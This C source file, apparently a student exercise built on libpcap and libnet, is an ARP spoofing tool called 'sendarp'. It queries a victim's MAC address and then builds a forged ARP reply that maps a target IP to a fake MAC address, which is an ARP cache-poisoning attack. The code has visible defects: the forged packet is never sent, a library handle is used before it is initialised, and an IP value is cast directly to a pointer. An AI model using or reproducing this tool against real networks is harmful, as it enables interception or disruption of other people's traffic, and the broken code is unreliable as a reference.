#include "yhs_libnet.h"

#define RPT 3
#define PROMISC 1
#define NONPROM 0

int print_devlist();		/* Print list of available network devices */
int print_netdev(char* dev);	/* Print Network Device Info */
void callback(u_char *user, const struct pcap_pkthdr *pkthdr, const u_char *packet);
void print_my_IPMAC(u_int32_t my_ip_addr, struct libnet_ether_addr* my_mac_addr);

int main(int argc, char* argv[]) {

	if(argc != 4){
		printf("syntax: sendarp <interface> <send ip> <target ip>\n");
		return -1;
	}

	int fd, bytes_written, j;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_int32_t my_ip_addr, send_ip_addr, target_ip_addr;
	u_int8_t mac_broadcast_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	u_int8_t mac_zero_addr[6] = {0, 0, 0, 0, 0, 0,};
	u_int8_t mac_terror_addr[6] = {0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc};
	struct bpf_program fp;
	struct libnet_ether_addr* my_mac_addr,*send_mac_addr, *target_mac_addr;
	struct pcap_pkthdr* header;
	const struct libnet_ethernet_hdr *ethernet;
	const struct libnet_arp_hdr *arp;
	const u_char *packet;

	bpf_u_int32 netp, maskp;
	pcap_t *handle;
	libnet_t *l;
	libnet_ptag_t arp_tag, ether_tag;

	char *dev = argv[1];	//eth0
	char *send_ip = argv[2];
	char *target_ip = argv[3];

	send_ip_addr = libnet_name2addr4(l, send_ip, LIBNET_DONT_RESOLVE);
	target_ip_addr = libnet_name2addr4(l, target_ip, LIBNET_DONT_RESOLVE);

	send_mac_addr = (struct libnet_ether_addr*)malloc(sizeof(struct libnet_ether_addr));
	target_mac_addr = (struct libnet_ether_addr*) malloc(sizeof(struct libnet_ether_addr));

	memcpy(target_mac_addr->ether_addr_octet, mac_terror_addr, ETHER_ADDR_LEN);

	char filter_exp[] = "arp";	/* *** FILTERING RULE *** */

	//if((dev = pcap_lookupdev(errbuf)) == NULL){
	//	fprintf(stderr, "%s\n", errbuf);
	//	exit(1);
	//}
	if((pcap_lookupnet(dev, &netp, &maskp, errbuf)) == -1){
		fprintf(stderr, "%s\n", errbuf);
		exit(1);
	}

	//if(print_devlist()) 	return -1;
	//if(print_netdev(dev)) 	return -1;
	
	handle = pcap_open_live(dev, BUFSIZ, PROMISC, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		exit(1);
	}
	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "Device %s doesn't provide Ethernet headers - not supported.\n", dev);
		exit(1);
	}
	if (pcap_compile(handle, &fp, filter_exp, 0, netp) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		exit(1);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		exit(1);
	}
	
	
////////////////////
	l = libnet_init(LIBNET_LINK, NULL, errbuf);
	if(l==NULL){
		fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
		exit(1);
	}
	//u_int32_t gw_ip_addr = libnet_name2addr4(l, "gateway", LIBNET_RESOLVE);
	my_ip_addr = libnet_get_ipaddr4(l);
	my_mac_addr = libnet_get_hwaddr(l); 
	
	if( (arp_tag = libnet_autobuild_arp(ARPOP_REQUEST, my_mac_addr->ether_addr_octet, (u_int8_t*)(&my_ip_addr), mac_zero_addr, (u_int8_t*)(&send_ip_addr), l)) == -1 ){
		fprintf(stderr, "Error building Ethernet header: %s\n", libnet_geterror(l));
		exit(1);
	}

	if(( ether_tag = libnet_autobuild_ethernet(mac_broadcast_addr, ETHERTYPE_ARP, l) ) == -1 ){
		fprintf(stderr, "Error building Ethernet header: %s\n", libnet_geterror(l));
		exit(1);
	}

	bytes_written = libnet_write(l);
	if(bytes_written != -1)
		printf("%d bytes written.\n", bytes_written);
	else
		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));

	//pcap_loop(handle, RPT, callback, NULL);

	while(1){
		if( pcap_next_ex(handle, &header, &packet) == -1 ){
			fprintf(stderr, "Error receiving arp	_reply: %s\n", pcap_geterr(handle));
			exit(1);
		}
		arp = (struct libnet_arp_hdr*)(packet + SIZE_ETHERNET);
		if(ntohs(arp->ar_op) != ARPOP_REPLY)
			continue;
		//이더넷 헤더정보 출력
		ethernet = (struct libnet_ethernet_hdr*)(packet);
		printf("\nETHERNET HEADER\n============================\n");
		printf("MAC DST: ");
		for(j = 0; j < ETHER_ADDR_LEN; j++) {
			printf("%02x ", ethernet->ether_dhost[j]);
		}
		printf("\nMAC SRC: ");
		for(j = 0; j < ETHER_ADDR_LEN; j++) {
			printf("%02x ", ethernet->ether_shost[j]);
		}
		printf("\n");

		memcpy(send_mac_addr->ether_addr_octet, packet+22, ETHER_ADDR_LEN);
		for(j = 0; j < ETHER_ADDR_LEN; j++) {
			printf("%02x ", send_mac_addr->ether_addr_octet[j]);
		}
		printf("\n");
		//printf("\nTarget MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", 
		break;	
	}

	if( libnet_build_arp( l->link_type, ETHERTYPE_IP, 6, 4, ARPOP_REPLY, target_mac_addr->ether_addr_octet, (u_int8_t*)target_ip_addr, send_mac_addr->ether_addr_octet, (u_int8_t*)send_ip_addr, NULL, 0, l, arp_tag ) == -1){
		fprintf(stderr, "Error building Ethernet header: %s\n", libnet_geterror(l));
		exit(1);
	}
	
	if( libnet_autobuild_ethernet(send_mac_addr->ether_addr_octet, ETHERTYPE_ARP, l) == -1 ){
		fprintf(stderr, "Error building Ethernet header: %s\n", libnet_geterror(l));
		exit(1);
	}
	libnet_destroy(l);	
	pcap_close(handle);
	return 0;
}

void print_my_IPMAC(u_int32_t ip_addr, struct libnet_ether_addr* mac_addr){
	printf("IP address: %s\n", libnet_addr2name4(ip_addr, LIBNET_DONT_RESOLVE));
	printf("MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",\
	mac_addr->ether_addr_octet[0],	mac_addr->ether_addr_octet[1],\
	mac_addr->ether_addr_octet[2], mac_addr->ether_addr_octet[3],\
	mac_addr->ether_addr_octet[4], mac_addr->ether_addr_octet[5]);
}

void callback(u_char *user, const struct pcap_pkthdr *hdr, const u_char *packet){

	int j;
	static int count = 1;
	const struct libnet_ethernet_hdr *ethernet;
	const struct libnet_ipv4_hdr *ip;
	const struct libnet_tcp_hdr *tcp;
	const char *payload;

	u_int size_ip;
	u_int size_tcp;
	u_int size_payload;

	printf("%u bytes captured\n", hdr->caplen);

	//이더넷 헤더정보 출력
	ethernet = (struct libnet_ethernet_hdr*)(packet);
	printf("\nETHERNET HEADER\n============================\n");
	printf("MAC DST: ");
	for(j = 0; j < ETHER_ADDR_LEN; j++) {
		printf("%02x ", ethernet->ether_dhost[j]);
	}
	printf("\nMAC SRC: ");
	for(j = 0; j < ETHER_ADDR_LEN; j++) {
		printf("%02x ", ethernet->ether_shost[j]);
	}
	printf("\nETHERNET TYPE: %04x", ntohs(ethernet->ether_type));

	//IPv4 헤더정보 출력
	if(ntohs(ethernet->ether_type) != ETHERTYPE_IP){			/* IP인지 확인 */
		printf("Not IP\n");
		return;
	}
	printf("\nIPv4 HEADER\n============================\n");
	ip = (struct libnet_ipv4_hdr*)(packet + SIZE_ETHERNET);
	size_ip = ip->ip_hl*4;
	if (size_ip < 20){
		printf("	* Invalid IP header length: %u bytes\n", size_ip);
		return;
	}
	printf("SRC IP ADDR: %s\n", inet_ntoa(ip->ip_src));
	printf("DST IP ADDR: %s\n", inet_ntoa(ip->ip_dst));

	//TCP 헤더정보 출력
	if(ip->ip_p != IPPROTO_TCP){						/* TCP인지 확인 */
		printf("Not TCP\n");
		return;
	}
	printf("TCP HEADER\n============================\n");
	tcp = (struct libnet_tcp_hdr*)(packet + SIZE_ETHERNET + size_ip);
	size_tcp = tcp->th_off*4;
	if (size_tcp < 20) {
		printf("	* Invalid TCP header length: %u bytes\n", size_tcp);
		return;
	}
	printf("Src Port: %d\n", ntohs(tcp->th_sport));
	printf("Dst Port: %d\n", ntohs(tcp->th_dport));

	//Data 출력
	payload = (char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
	if(size_payload > 0) {
		printf("\nPayload (%d bytes):\n", size_payload);
		for(j = 0; j < size_payload; j++) {
			printf("%02x ", payload[j]);
			if(j == 15) break;
		}	
		printf("\n");
	}
	else
		printf("\nNo Payload.\n");
}

int print_netdev(char* dev){
	char *net;
	char *mask;
	char errbuf[PCAP_ERRBUF_SIZE];
	bpf_u_int32 netp, maskp;
	struct in_addr addr;

	if((pcap_lookupnet(dev, &netp, &maskp, errbuf)) == -1){
		fprintf(stderr, "%s\n", errbuf);
		return -1;
	}
		
	printf("DEV: %s\n", dev);

	addr.s_addr = netp;
	if((net = inet_ntoa(addr)) == NULL){
		perror("inet_ntoa");
		return -1;
	}
	printf("NET: %s\n", net);

	addr.s_addr = maskp;
	if((mask = inet_ntoa(addr)) == NULL){
		perror("inet_ntoa");
		return -1;
	}
	printf("MASK: %s\n", mask);
	
	return 0;
}

int print_devlist(){

	int i;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_if_t *alldevs;
	pcap_if_t *d;

	if(pcap_findalldevs(&alldevs, errbuf) == -1){
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		return 1;
	}
	
	printf("\n-- List of available devices --\n");
	for(d = alldevs; d != NULL; d = d->next){
		printf("%d %s", ++i, d->name);
		if(d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if(i == 0){
		printf("\nNo interfaces found! Make sure Pcap is installed.\n");
		return 0;
	}	
	pcap_freealldevs(alldevs);

	return 0;
}
